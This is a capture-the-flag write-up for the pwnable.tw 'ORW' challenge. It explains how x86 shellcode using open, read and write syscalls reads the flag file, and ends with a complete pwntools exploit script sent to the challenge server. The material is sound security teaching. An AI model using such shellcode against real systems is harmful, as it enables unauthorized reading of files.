---
title: "ORW"
event: pwnable.tw
difficulty: easy
date: 2020-07-16
draft: false
tags: ["pwnable.tw"]
---

This is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in pwnable.tw which is stack based.
<!--more-->

![](/images/pwnable2/pwnable1.png)

## Solution: 

First I check the mitigations :

![](/images/pwnable2/pwnable2.png)

* We have NX disabled. That means it is something to do with the shellcode.
* Seems like there is a canary which will not allow you to do a stack based buffer overflows.
* there is no pie so the address of the binary will be same every time you run.

Let's see the disassembly of this program
![](/images/pwnable2/pwnable.gif)

Here we can see that our input is being put in the address ``0x804a060`` and then it is moved to EAX and then after that EAX is called.
Meaning: our input is being executed. Now, let us run the binary and see what is happening :>

![](/images/pwnable2/pwnable3.png)

> Hmm… We get a segfault.

## Idea:

* As said in the question we will you three syscalls and then get the flag
* First call: open the flag file
* Second call: read the file
* Third call: write it to the output

## Exploit:

We will see the exploit in parts.

## Part 1

![](/images/pwnable2/pwnable4.png)

* We make EAX to 5
* we push the string "///home/orw/flag"
* We make EBX pointing to the stack ( the string )
* We make EDX equal to 0 and then we make the syscall.

## Part 2

![](/images/pwnable2/pwnable5.png)

* We make EAX equal to 3
* We make ECX point to the string
* Give EDX the buffer size
* Call the syscall

## Part 3

![](/images/pwnable2/pwnable6.png)

* We make EAX equal to 4
* Make EBX equal to 0
* Add 1 to EBX / making EBX equal to 1. Then call the syscall.

> Refer to the below image if having any doubts !!

![](/images/pwnable2/pwnable7.png)

If we put all of the things together, then we get the flag.

![](/images/pwnable2/pwnable8.png)

```py

from pwn import *
p = remote('chall.pwnable.tw',10001)
print p.recv()
s = asm("xor eax, eax")
s += asm("push eax")
s += asm("add eax, 5")
s += asm("push 0x67616c66")
s += asm("push 0x2f77726f")
s += asm("push 0x2f656d6f")
s += asm("push 0x682f2f2f")
s += asm("mov ebx, esp")
s += asm("mov edx, 0")
s += asm("int 0x80")
s += asm("mov eax, 3")
s += asm("mov ecx, ebx")
s += asm("mov ebx, 3")
s += asm("mov edx, 40")
s += asm("int 0x80")
s += asm("mov eax, 4")
s += asm("mov ebx, 0")
s += asm("inc ebx")
s += asm("int 0x80")
p.send(s)
f = p.recv()
print f
p.interactive()

```
> update: Back when I wrote this, it was python2, times were good.
 
If you want to try out more pwnable.tw but are stuck you can checkout [pwn-hub: pwnable.tw](https://github.com/tourpran/pwn-hub/tree/main/pwnable.tw) repo